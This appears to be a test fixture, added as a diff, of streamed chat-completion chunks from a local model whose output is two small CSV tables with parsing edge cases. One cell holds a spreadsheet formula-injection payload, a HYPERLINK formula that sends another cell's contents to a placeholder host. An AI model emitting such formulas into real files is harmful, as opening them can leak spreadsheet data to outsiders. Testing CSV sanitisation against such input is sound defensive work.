@@ -1,0 +1,10 @@
+data: {"id":"chatcmpl-42","object":"chat.completion.chunk","created":1791990002,"model":"llama3.2:3b","system_fingerprint":"fp_ollama","choices":[{"index":0,"delta":{"role":"assistant","content":"The file has two tables.\n\n```csv\nRegion,Revenue\nNorth,\"1,200\"\nSouth,=HYPERLINK(\"http://example.com/?\"&A1)\n```\n\n"},"finish_reason":null}]}
+
+data: {"id":"chatcmpl-42","object":"chat.completion.chunk","created":1791990002,"model":"llama3.2:3b","system_fingerprint":"fp_ollama","choices":[{"index":0,"delta":{"role":"assistant","content":"```csv\nQuarter,Change,Note\nQ3,-4.5,\"said \"\"flat\"\"\"\nQ4,+2,- see below\n```"},"finish_reason":null}]}
+
+data: {"id":"chatcmpl-42","object":"chat.completion.chunk","created":1791990002,"model":"llama3.2:3b","system_fingerprint":"fp_ollama","choices":[{"index":0,"delta":{"role":"assistant","content":""},"finish_reason":"stop"}]}
+
+data: {"id":"chatcmpl-42","object":"chat.completion.chunk","created":1791990002,"model":"llama3.2:3b","system_fingerprint":"fp_ollama","choices":[],"usage":{"prompt_tokens":240,"completion_tokens":58,"total_tokens":298}}
+
+data: [DONE]
+
